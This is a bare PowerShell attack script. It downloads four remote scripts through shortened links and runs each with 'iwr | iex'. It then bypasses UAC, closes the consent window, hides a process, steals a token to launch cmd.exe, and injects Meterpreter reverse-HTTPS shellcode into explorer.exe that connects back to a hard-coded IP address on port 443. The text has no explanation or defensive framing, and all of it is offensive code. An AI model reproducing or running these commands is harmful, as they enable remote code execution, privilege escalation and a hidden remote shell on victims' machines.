iwr https://goo.gl/x6ZcHM | iex;
iwr https://goo.gl/zggqse | iex;
iwr https://goo.gl/wxJHHq | iex;
iwr https://goo.gl/UJL3nD | iex;

workflow Test
{
    Parallel
    {
        ${ Bypass-UAC -Method UacMethodNetOle32 };
        ${ kill-window consent };
        ${ hide-process mmc };
        ${ UAC-TokenMagic -BinPath C:\Windows\System32\cmd.exe -ProcPID (ps -Name mmc).id };
        ${ Invoke-Shellcode -ProcessId $((ps -Name explorer.exe).id) -Payload windows/meterpreter/reverse_https -Lhost  45.76.178.205 -Lport 443 };
    }
}

Test
